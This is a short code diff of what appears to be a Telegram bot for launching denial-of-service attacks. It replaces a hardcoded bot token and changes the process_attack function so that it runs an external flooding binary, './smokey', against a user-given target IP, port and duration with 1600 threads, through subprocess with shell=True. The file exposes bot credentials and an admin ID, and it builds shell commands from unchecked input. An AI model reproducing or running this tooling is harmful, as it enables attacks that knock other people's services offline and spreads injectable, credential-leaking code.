@@ -6,7 +6,7 @@ import threading
 import json
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-bot = telebot.TeleBot('7571130670:AAGZsaxxoB9EOG1kvRZRuqrpIpHQ5NVPNN8')
+bot = telebot.TeleBot('77815465728:AAED1YXsX3-lgMShGfqVIOAMRXnSouvZpvs')
 
 # Admin user IDs
 admin_id = ["2007860433"]
@@ -84,7 +84,7 @@ def process_attack(message, target, port, time):
     start_attack_reply(message, target, port, time)
     
     # Execute the attack
-    full_command = f"./mrin {target} {port} {time} 600"
+    full_command = f"./smokey {target} {port} {time} 1600"
     try:
         subprocess.run(full_command, shell=True, check=True)
     except subprocess.CalledProcessError:
